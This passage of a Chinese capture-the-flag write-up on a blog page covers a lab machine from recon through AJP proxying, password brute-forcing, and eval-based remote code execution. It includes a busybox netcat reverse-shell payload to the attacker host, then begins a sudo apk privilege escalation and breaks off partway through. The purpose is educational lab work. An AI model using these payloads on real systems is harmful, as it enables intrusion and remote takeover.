@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="![image-20250716205953078](https://7r1UMPHK.github.io/image/20250716205953466.webp)
+
+![image-20250716210011392](https://7r1UMPHK.github.io/image/20250716210011546.webp)
+
+哈哈，整个活，补些wp
+
+# 一、信息收集与服务探测
+
+## 1. 主机发现
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
+
+4 responded
+```
+
+扫描结果显示，IP 地址为 192.168.205.190
+
+## 2. 端口与服务扫描
+
+确定目标 IP 后，使用 nmap 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。">
+<meta property="og:title" content="内部_ajpsvr">
+<meta property="og:description" content="![image-20250716205953078](https://7r1UMPHK.github.io/image/20250716205953466.webp)
+
+![image-20250716210011392](https://7r1UMPHK.github.io/image/20250716210011546.webp)
+
+哈哈，整个活，补些wp
+
+# 一、信息收集与服务探测
+
+## 1. 主机发现
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
+
+4 responded
+```
+
+扫描结果显示，IP 地址为 192.168.205.190
+
+## 2. 端口与服务扫描
+
+确定目标 IP 后，使用 nmap 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_ajpsvr</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_ajpsvr</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/141" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7f2b5906b86fb488d53d571e53001ec6e1bba28a42f93bd32349e19eccff6c17/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363230353935333436362e77656270"><img src="https://camo.githubusercontent.com/7f2b5906b86fb488d53d571e53001ec6e1bba28a42f93bd32349e19eccff6c17/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363230353935333436362e77656270" alt="image-20250716205953078" data-canonical-src="https://7r1UMPHK.github.io/image/20250716205953466.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cdf07c7195f5c393b4b2b41b22f587ca25cb6fd782f77a4e24c4ed30bd44c025/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363231303031313534362e77656270"><img src="https://camo.githubusercontent.com/cdf07c7195f5c393b4b2b41b22f587ca25cb6fd782f77a4e24c4ed30bd44c025/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363231303031313534362e77656270" alt="image-20250716210011392" data-canonical-src="https://7r1UMPHK.github.io/image/20250716210011546.webp" style="max-width: 100%;"></a></p>
+<p>哈哈，整个活，补些wp</p>
+<h1>一、信息收集与服务探测</h1>
+<h2>1. 主机发现</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
+
+4 responded</pre></div>
+<p>扫描结果显示，IP 地址为 192.168.205.190</p>
+<h2>2. 端口与服务扫描</h2>
+<p>确定目标 IP 后，使用 nmap 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.190
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 09:01 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.190
+Host is up (0.00026s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8010/tcp open  xmpp</pre></div>
+<p>结果显示目标开放了三个端口：</p>
+<ul>
+<li><strong>22/tcp</strong>: SSH 服务，通常用于远程登录。</li>
+<li><strong>80/tcp</strong>: HTTP 服务，即标准 Web 服务。</li>
+<li><strong>8010/tcp</strong>: nmap 初步识别为 xmpp，但需要进一步确认。</li>
+</ul>
+<h1>二、Web 探索与 AJP 代理</h1>
+<h2>1. 初探 80 端口</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl 192.168.205.190     
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head&gt;&lt;title<span class="pl-k">&gt;</span>403 Forbidden<span class="pl-k">&lt;</span>/title&gt;&lt;/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>center&gt;&lt;h<span class="pl-k">1&gt;</span>403 Forbidden<span class="pl-k">&lt;</span>/h1&gt;&lt;/center<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>hr&gt;&lt;center<span class="pl-k">&gt;</span>nginx<span class="pl-k">&lt;</span>/center<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
+                </pre></div>
+<p>使用 gobuster 进行目录爆破也未发现任何有价值的路径</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ gobuster dir -u http://192.168.205.190 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.190
+[+] Method:                  GET
+[+] Threads:                 64
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html,zip
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+===============================================================
+Progress: 1102795 / 1102800 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                    </pre></div>
+<h2>2.8010 端口与 AJP</h2>
+<p>情况有点不对，看看8010是什么服务</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">PORT     STATE SERVICE VERSION
+8010/tcp open  xmpp<span class="pl-k">?</span>
+<span class="pl-k">|</span> fingerprint-strings: 
+<span class="pl-k">|</span>   GenericLines: 
+<span class="pl-k">|</span>_    ajpy
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi<span class="pl-k">?</span>new-service <span class="pl-c1">:</span>
+SF-Port8010-TCP:V=7.95%I=7%D=7/16%Time=6877A304%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,8,<span class="pl-s"><span class="pl-pds">"</span>\x124\0\x04ajpy<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+MAC Address: 08:00:27:B0:70:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 6.81 seconds
+                           </pre></div>
+<p>搜索了一下</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/20f42d34bda1ff07ae50201940844d82f177c5d21159eb1c0983cb634bfcf652/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363231303333383231382e77656270"><img src="https://camo.githubusercontent.com/20f42d34bda1ff07ae50201940844d82f177c5d21159eb1c0983cb634bfcf652/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363231303333383231382e77656270" alt="image-20250716210338088" data-canonical-src="https://7r1UMPHK.github.io/image/20250716210338218.webp" style="max-width: 100%;"></a></p>
+<p>通过搜索，我们了解到 8010 端口很可能运行着 <strong>AJP (Apache JServ Protocol)</strong> 服务。</p>
+<div class="markdown-alert markdown-alert-tip"><p class="markdown-alert-title"><svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p>
+<p><strong>什么是 AJP？</strong></p>
+<p>AJP 是一个二进制协议，设计用于反向代理服务器（如 Apache HTTP Server）与后端的应用服务器（如 Apache Tomcat）之间进行通信。它比 HTTP 更高效，因为它在设计上减少了网络开销。我们不能像访问普通网页一样直接通过浏览器访问 AJP 服务。</p>
+</div>
+<p>为了与 AJP 服务交互，我们需要设置一个本地代理。这里我们使用 Apache httpd 服务器的 mod_proxy_ajp 模块，将我们本地的 8000 端口收到的 HTTP 请求转发到目标的 8010 端口。</p>
+<p><strong>代理配置步骤：</strong></p>
+<ol>
+<li>
+<p>启用 Apache 的相关代理模块：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo apt-get install apache2
+sudo a2enmod proxy    
+sudo a2enmod proxy_http
+sudo a2enmod proxy_ajp        </pre></div>
+</li>
+<li>
+<p>创建一个新的 Apache 站点配置文件 <code class="notranslate">/etc/apache2/sites-available/ajp-proxy.conf</code>：</p>
+<div class="highlight highlight-source-apacheconf"><pre class="notranslate"><span class="pl-k">Listen</span> <span class="pl-c1">8000</span>
+&lt;<span class="pl-e">VirtualHost</span> <span class="pl-s">*:8000</span>&gt;
+    <span class="pl-k">ProxyPass</span> / ajp://<span class="pl-c1">192</span>.<span class="pl-c1">168</span>.<span class="pl-c1">205</span>.<span class="pl-c1">190</span>:<span class="pl-c1">8010</span>/
+    <span class="pl-k">ProxyPassReverse</span> / ajp://<span class="pl-c1">192</span>.<span class="pl-c1">168</span>.<span class="pl-c1">205</span>.<span class="pl-c1">190</span>:<span class="pl-c1">8010</span>/
+&lt;/<span class="pl-e">VirtualHost</span>&gt;</pre></div>
+</li>
+<li>
+<p>启用该站点并重启 Apache 服务：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo a2ensite ajp-proxy.conf
+sudo systemctl restart apache2</pre></div>
+</li>
+</ol>
+<p>配置完成后，访问我们自己机器的 <code class="notranslate">http://127.0.0.1:8000</code> (或 <code class="notranslate">http://192.168.205.128:8000</code>) 就相当于在访问目标 <code class="notranslate">192.168.205.190:8010</code> 上的 Web 应用了。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b93b1e4aa94f16cf15a5c3357989a6539e79ad06ab54575cb3c9a2eadf7c0bb6/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363231303732323036302e77656270"><img src="https://camo.githubusercontent.com/b93b1e4aa94f16cf15a5c3357989a6539e79ad06ab54575cb3c9a2eadf7c0bb6/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731363231303732323036302e77656270" alt="image-20250716210721870" data-canonical-src="https://7r1UMPHK.github.io/image/20250716210722060.webp" style="max-width: 100%;"></a></p>
+<h1>三、漏洞利用与初始访问</h1>
+<p>代理设置成功后，我们再次对代理后的地址进行目录爆破。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ gobuster dir -u http://192.168.205.128:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64
+===============================================================
+/login                (Status: 200) [Size: 21]
+/test                 (Status: 200) [Size: 12]
+/backdoor             (Status: 200) [Size: 9]
+===============================================================                             </pre></div>
+<p>这次我们发现了三个路径：<code class="notranslate">/login</code>, <code class="notranslate">/test</code>, <code class="notranslate">/backdoor</code>。</p>
+<h2>1. 登录页面爆破</h2>
+<p>经过测试发现，<code class="notranslate">/login</code> 路径接受一个 <code class="notranslate">password</code> 参数，并提示密码长度为 5。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.128:8000/login?password=test<span class="pl-pds">'</span></span>
+Password length is 5</pre></div>
+<p>这暗示我们需要爆破一个长度为 5 的密码。然而，直接使用常规字典爆破会遇到问题，因为后端对特殊字符的长度计算方式可能与我们预想的不同。正确的做法是对字典中的每一个密码进行 URL 编码。</p>
+<ol>
+<li>
+<p>从 <code class="notranslate">rockyou.txt</code> 中筛选出所有长度为 5 的密码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">grep -x <span class="pl-s"><span class="pl-pds">'</span>^.\{5\}$<span class="pl-pds">'</span></span> /usr/share/wordlists/rockyou.txt <span class="pl-k">&gt;</span> 5z.txt</pre></div>
+</li>
+<li>
+<p>使用 Python 对筛选后的字典进行 URL 编码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python3 -c <span class="pl-s"><span class="pl-pds">'</span>import sys, urllib.parse; [print(urllib.parse.quote(line.strip())) for line in sys.stdin]<span class="pl-pds">'</span></span> <span class="pl-k">&lt;</span> 5z.txt <span class="pl-k">&gt;</span> 5z_u.txt</pre></div>
+</li>
+<li>
+<p>使用 <code class="notranslate">ffuf</code> 和编码后的字典进行爆破，并过滤掉返回内容为空的响应 (<code class="notranslate">--fs 0</code>)：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ffuf -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128:8000/login?password=FUZZ<span class="pl-pds">"</span></span> -w 5z_u.txt --fs 0
+...
+%21%40%23%24%25         [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 2ms]
+...</pre></div>
+</li>
+</ol>
+<p>我们找到了一个有效的密码 <code class="notranslate">%21%40%23%24%25</code>，它解码后是 <code class="notranslate">!@#$%</code>。</p>
+<h2>2. 后门与远程代码执行（RCE）</h2>
+<p>用找到的密码访问登录页面，返回了一个新的路径：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.128:8000/login?password=%21%40%23%24%25<span class="pl-pds">'</span></span>
+/backdoooooooooooooooooor</pre></div>
+<p>访问这个 <code class="notranslate">/backdoooooooooooooooooor</code> 路径，并尝试传入 <code class="notranslate">cmd</code> 参数执行命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=id<span class="pl-pds">'</span></span>
+<span class="pl-k">&lt;</span>built-in <span class="pl-k">function</span> <span class="pl-en">id&gt;</span></pre></div>
+<p>返回结果 <code class="notranslate">&lt;built-in function id&gt;</code> 表明后端很可能使用了 Python 的 <code class="notranslate">eval()</code> 或类似函数来执行代码，并且没有导入 <code class="notranslate">os</code> 模块。为了执行系统命令，我们需要先导入 <code class="notranslate">os</code> 模块。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__("os").popen("whoami").read()<span class="pl-pds">'</span></span>
+welcome</pre></div>
+<p>成功执行命令！我们当前的用户是 <code class="notranslate">welcome</code>。</p>
+<h2>3. 反弹 Shell</h2>
+<p>为了获得一个更稳定的交互式 Shell，我们利用这个 RCE 漏洞反弹一个 Shell 到我们的攻击机上。目标系统上存在 <code class="notranslate">busybox</code>，它集成了 <code class="notranslate">nc</code> (netcat) 工具。</p>
+<ol>
+<li>在攻击机（Kali）上监听 8888 端口：</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+<ol start="2">
+<li>通过 URL 发送反弹 Shell 的 payload（注意 <code class="notranslate">+</code> 在 URL 中会被视为空格，这里是 <code class="notranslate">busybox</code> 多功能二进制文件的用法）：</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__("os").popen("busybox+nc+192.168.205.128+8888+-e+/bin/bash").read()<span class="pl-pds">'</span></span></pre></div>
+<p>攻击机成功接收到连接，我们获得了 <code class="notranslate">welcome</code> 用户的 Shell。</p>
+<h2>4. 稳定 Shell 并获取用户 Flag</h2>
+<p>为了更好的交互体验，我们将这个简陋的 Shell 升级为功能齐全的 TTY。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python -c <span class="pl-s"><span class="pl-pds">'</span>import pty; pty.spawn("/bin/bash")<span class="pl-pds">'</span></span>
+Ctrl+Z
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 24 columns 80</pre></div>
+<p>在 <code class="notranslate">welcome</code> 用户的家目录下，我们找到了第一个 flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">localhost:<span class="pl-k">~</span>$ ls -al
+...
+-rw-r--r--    1 root     welcome         39 Jul 14 15:11 user.txt
+localhost:<span class="pl-k">~</span>$ cat user.txt
+flag{5a80870310e5a3bc10c00ef6d20a3cac}</pre></div>
+<h1>四、权限提升</h1>
+<p>我们的目标是 root 权限，因此需要进行提权。</p>
+<h2>1. 提权至 superuser</h2>
+<p>在枚举系统时，发现一个只监听在本地 <code class="notranslate">127.0.0.1:5000</code> 的可疑服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">localhost:<span class="pl-k">~</span>$ netstat -lntup
+...
+tcp        0      0 127.0.0.1:5000          0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+...
+localhost:<span class="pl-k">~</span>$ busybox nc 127.0.0.1 5000
+Welcome to SignatureChain CTF over TCP<span class="pl-k">!</span>
+Type <span class="pl-s"><span class="pl-pds">'</span>view<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>submit<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>hint<span class="pl-pds">'</span></span>, or <span class="pl-s"><span class="pl-pds">'</span>exit<span class="pl-pds">'</span></span>
+<span class="pl-k">&gt;</span> view
+[
+  {
+    <span class="pl-s"><span class="pl-pds">"</span>index<span class="pl-pds">"</span></span>: 1,
+    <span class="pl-s"><span class="pl-pds">"</span>sender<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>system<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>recipient<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>alice<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>amount<span class="pl-pds">"</span></span>: 100,
+    <span class="pl-s"><span class="pl-pds">"</span>signature<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>14ed219616014b683ae66d1ec2e098c84ff09695b33fff0a7652505e260be0aa<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>note<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>1<span class="pl-pds">"</span></span>
+  },
+  {
+    <span class="pl-s"><span class="pl-pds">"</span>index<span class="pl-pds">"</span></span>: 2,
+    <span class="pl-s"><span class="pl-pds">"</span>sender<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>alice<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>recipient<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>bob<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>amount<span class="pl-pds">"</span></span>: 50,
+    <span class="pl-s"><span class="pl-pds">"</span>signature<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>08188ce485e280ba7d8c614a776a478d75ac2e985a535d1d126117ceb59ac952<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>note<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>2<span class="pl-pds">"</span></span>
+  }
+]
+<span class="pl-k">&gt;</span> hint
+[Hint 1] Use <span class="pl-s"><span class="pl-pds">'</span>view<span class="pl-pds">'</span></span> to inspect part of the blockchain.
+[Hint 2] The signature is just sha256(sender-<span class="pl-k">&gt;</span>recipient:amount).
+[Hint 3] Try forging a valid signature with this knowledge.
+[Hint 4] What <span class="pl-k">if</span> admin sent you 999 coins<span class="pl-k">?</span></pre></div>
+<ol>
+<li>使用 <code class="notranslate">view</code> 查看区块链的一部分。</li>
+<li>签名就是 <code class="notranslate">sha256(sender-&gt;recipient:amount)</code>。</li>
+<li>试着用这些知识伪造一个有效的签名。</li>
+<li>如果管理员给你发送了 999 枚硬币呢？</li>
+</ol>
+<p>连接该服务后，发现是一个基于区块链签名的 CTF 挑战。</p>
+<p>get不到，扒拉一下其他地方</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">localhost:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /opt/
+localhost:/opt$ ls -al
+total 16
+drwxr-xr-x    4 root     root          4096 Jul 13 14:43 <span class="pl-c1">.</span>
+drwxr-xr-x   21 root     root          4096 Jul 13 18:06 ..
+drwx--x--x    4 root     root          4096 Jul  9 16:53 containerd
+drwxr-xr-x    2 root     root          4096 Jul 14 15:13 server
+localhost:/opt$ <span class="pl-c1">cd</span> server/
+localhost:/opt/server$ ls -al
+total 16
+drwxr-xr-x    2 root     root          4096 Jul 14 15:13 <span class="pl-c1">.</span>
+drwxr-xr-x    4 root     root          4096 Jul 13 14:43 ..
+-rw-r--r--    1 root     root            98 Jul 13 16:27 Dockerfile
+-rw-r--r--    1 root     root          3667 Jul 13 16:21 server.py
+localhost:/opt/server$ cat server.py
+import socket
+import threading
+import json
+import hashlib
+
+FLAG = <span class="pl-s"><span class="pl-pds">"</span>flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}<span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> ... 此处省略大量代码 ...</span></pre></div>
+<p>有捷径，哈哈哈</p>
+<p>代码中硬编码了一个 flag：<code class="notranslate">flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}</code>。根据 flag 的格式，我们可以推断出存在一个名为 <code class="notranslate">superuser</code> 的用户，其密码可能是 <code class="notranslate">f124cf868d5e3fa5a7de39f80a2f9a0e</code>。</p>
+<p>使用此凭据切换用户成功。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">localhost:/opt/server$ <span class="pl-c1">cd</span> /home/
+localhost:/home$ su superuser
+Password: 
+/home $ id
+uid=1001(superuser) gid=1001(superuser) groups=300(abuild),1001(superuser)</pre></div>
+<h2>2. 提权至 root</h2>
+<p>成为 <code class="notranslate">superuser</code> 后，检查 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/home $ sudo -l
+User superuser may run the following commands on localhost:
+    (ALL) NOPASSWD: /sbin/apk</pre></div>
+<p>这是一个关键突破口！我们可以无需密码以 root 权限运行 <code class="notranslate">apk</code> 命令。<code class="notranslate">apk</code> 是 Alpine Linux 的包管理器。我们可以创建一个包含恶意安装后脚本的自定义 <code class="notranslate">.apk</code> 包，然后用 <code class="notranslate">sudo apk</code> 来安装它。该脚本将以 root 权限执行。</p>
+<p><strong>提权步骤：</strong></p>
+<ol>
+<li><strong>创建恶意包工作目录和文件</strong>
+<ul>
+<li><code class="notranslate">APKBUILD</code>：定义包名、版本等元信息。</li>
+<li><code class="notranslate">pwn.post-install</code>：安装后要执行的脚本。我们可以在这里写入提权命令。</li>
+</ul>
+</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 创建工作目录</span>
+mkdir /tmp/malicious-pkg
+<span class="pl-c1">cd</span> /tmp/malicious-pkg
+
